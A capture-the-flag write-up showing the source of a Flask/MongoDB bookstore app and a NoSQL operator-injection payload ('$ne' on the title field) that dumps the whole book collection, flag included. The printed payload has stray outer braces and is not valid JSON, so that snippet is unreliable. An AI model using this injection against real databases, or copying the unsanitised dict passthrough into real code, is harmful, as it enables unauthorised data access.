# Challenge description

Unfortunately it seems I've forgotten the name of my book...

Note: the flag format will be FLAG{...} instead of gigem{...}.

# Soluce

Here is the source code of the website:

```python
from flask import Flask, request, render_template, jsonify
from pymongo import MongoClient
import re

app = Flask(__name__)

client = MongoClient("mongodb://localhost:27017/")
db = client['aggie_bookstore']
books_collection = db['books']

def sanitize(input_str: str) -> str:
    return re.sub(r'[^a-zA-Z0-9\s]', '', input_str)

@app.route('/')
def index():
    return render_template('index.html', books=None)

@app.route('/search', methods=['GET', 'POST'])
def search():
    query = {"$and": []}
    books = []

    if request.method == 'GET':
        title = request.args.get('title', '').strip()
        author = request.args.get('author', '').strip()

        title_clean = sanitize(title)
        author_clean = sanitize(author)

        if title_clean:
            query["$and"].append({"title": {"$eq": title_clean}})  

        if author_clean:
            query["$and"].append({"author": {"$eq": author_clean}}) 

        if query["$and"]:
            books = list(books_collection.find(query))


        return render_template('index.html', books=books)

    elif request.method == 'POST':
        if request.content_type == 'application/json':
            try:
                data = request.get_json(force=True)

                title = data.get("title")
                author = data.get("author")
                if isinstance(title, str):
                    title = sanitize(title)
                    query["$and"].append({"title": title})
                elif isinstance(title, dict):
                    query["$and"].append({"title": title})

                if isinstance(author, str):
                    author = sanitize(author)
                    query["$and"].append({"author": author})
                elif isinstance(author, dict):
                    query["$and"].append({"author": author})

                if query["$and"]:
                    books = list(books_collection.find(query))
                    return jsonify([
                        {"title": b.get("title"), "author": b.get("author")} for b in books
                    ])

                return jsonify({"error": "Empty query"}), 400

            except Exception as e:
                return jsonify({"error": str(e)}), 500

        return jsonify({"error": "Unsupported Content-Type"}), 400
    
if __name__ == "__main__":
    app.run("0.0.0.0", 8000)
```

The flag is in the database, we just need to find it. This is a mongoDB database, so we will try to inject a command in the `title` field. We will use the following payload:

```json
{
    {
    "title": { "$ne": "" }
    }
}
```

This will return all the books in the database. The `$ne` operator is used to check if the value is not equal to the specified value. In this case, we are checking if the title is not equal to an empty string. This will return all the books in the database.

Then we can see the flag in the response:

```json
[{"author":"John Doe","title":"The Lost Book of Secrets"},{"author":"Arthur Conan Doyle","title":"A Study in Scarlet"},{"author":"Mark Twain","title":"The Adventures of Huckleberry Finn"},{"author":"George Orwell","title":"1984"},{"author":"Aldous Huxley","title":"Brave New World"},{"author":"Robert Louis Stevenson","title":"Treasure Island"},{"author":"System","title":"Internal Manual"},{"author":"SysAdmin","title":"Admin Operations Guide"},{"author":"QA Bot","title":"Test Entry - Ignore"},{"author":"admin","title":"FLAG{nosql_n0_pr0bl3m}"}]
```

So the flag is `FLAG{nosql_n0_pr0bl3m}`.